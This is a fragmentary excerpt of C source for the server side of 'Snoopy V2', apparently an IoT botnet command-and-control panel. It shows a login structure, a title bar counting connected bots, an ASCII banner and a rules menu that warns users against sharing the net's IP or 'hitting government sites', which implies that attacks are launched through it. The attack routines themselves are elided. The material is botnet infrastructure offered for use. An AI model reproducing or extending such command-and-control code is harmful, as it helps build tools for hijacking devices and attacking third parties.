...
//Ry Rdm Snoopy. Server Side                                                                                                                                                                                                                                                                                                                                                                                                                                                Created by RYRDM9#5652 and S4tan's USB
struct login_info {
	char username[100];
	char password[100];
};
...
void *TitleWriter(void *sock) {
    ...
    while(1) {
        ...
        sprintf(string, "%c]0; %d IoT | Snoopy.  %c", '\033', BotsConnected(), '\007');
  ...
  sprintf(ascii_banner_line1,  "\e[0m   Snoopy V2\e[90m.                   \e[0m\r\n");
  sprintf(ascii_banner_line2,  "\e[0m               ,-.                 \e[0m\r\n");
  sprintf(ascii_banner_line3,  "\e[0m             .:\\ \e[90m'\e[0m`-.  \e[0m\r\n");
  sprintf(ascii_banner_line4,  "\e[0m             |:| \e[90m __ b       \e[0m\r\n");
  sprintf(ascii_banner_line5,  "\e[0m              `;\e[90m-\e[0m(      \e[0m\r\n");
  sprintf(ascii_banner_line6,  "\e[0m             ,'  |                 \e[0m\r\n");
  sprintf(ascii_banner_line7,  "\e[0m            ( \\|||                \e[0m\r\n");
  sprintf(ascii_banner_line8,  "\e[0m           (.-''--`                \e[0m\r\n");
  sprintf(ascii_banner_line9,  "\e[0m                                   \e[0m\r\n");
  ...
  if(send(datafd, ascii_banner_line9, strlen(ascii_banner_line9), MSG_NOSIGNAL) == -1) goto end;
		...
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
			...
			if(strstr(buf, "rule") || strstr(buf, "RULE") || strstr(buf, "RULE") || strstr(buf, "rules") || strstr(buf, "RULES") || strstr(buf, "Rules")) {
				...
				sprintf(p2,  "\e[0m RULE 1\e[90m. \e[1;31mNO SHARING NET IP            \e[0m\r\n");
				sprintf(p3,  "\e[0m RULE 2\e[90m. \e[1;31mNO SPAMMING ATTACKS          \e[0m\r\n");
				sprintf(p4,  "\e[0m RULE 3\e[90m. \e[1;31mNO SHARING NET LOGIN INFO    \e[0m\r\n");
				sprintf(p5,  "\e[0m RULE 4\e[90m. \e[1;31mNO HITTING GOVERMENT SITES   \e[0m\r\n");
